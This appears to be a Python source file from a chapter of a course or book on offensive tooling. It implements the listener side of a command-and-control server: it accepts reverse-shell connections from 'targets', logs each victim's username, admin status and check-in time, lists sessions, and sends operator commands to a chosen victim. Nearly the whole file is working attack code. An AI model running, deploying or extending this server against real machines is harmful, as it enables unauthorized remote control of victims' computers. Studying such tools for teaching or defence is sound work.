#Chapter 12

import sys
import socket
import threading
from prettytable import PrettyTable
import time
from datetime import datetime

def banner():
    print("┌┐ ┬ ┬╦  ┌─┐┬─┐┌─┐┌┬┐")
    print("├┴┐└┬┘║  │ │├┬┘├┤  │")
    print("└─┘ ┴ ╩═╝└─┘┴└─└─┘ ┴")

def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input('send message#>')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == "exit":
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def comm_handler():
    # Remote_ip returns a tupple of the IP and the Port, so if you use remote_ip[0], only the ip will be returned.
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_val = "Yes"
            else:
                admin_val = "No"
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_val])
                print(f'[+] Connection reveived from {remote_ip[0]}\nEnter command#>')
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'[+] Connection reveived from {host_name[0]}@{remote_ip[0]}\nEnter command#>')

        except KeyboardInterrupt:
            print('[+] Keyboard interrupt issued.')
            remote_target.close()
            break

        except Exception:
            remote_target.close()
            break



def listener_handler(host_ip, host_port, targets):
    sock.bind((host_ip, host_port))
    print("[+] Awaiting connection from client...")
    sock.listen()
    #Initializes the thread and runs it in the background
    t1 = threading.Thread(target=comm_handler)
    #After the thread is initialized, it redirects bacj to the While loop from the main functionality.
    t1.start()

if __name__ == '__main__':
    targets = []
    #Kill the while loop in comm_handler
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        banner()
        listener_handler(host_ip, host_port, targets)
    except IndexError:
        print("[-] Command line argument(s) missing. Please try again. ")
    except Exception as e:
        print(e)
    while True:
        try:
            command = input("Enter command>")
            if command.split(" ")[0] == "sessions":
                session_counter = 0
                #List sessions command handling
                if command.split(" ")[1] == "-l":
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break

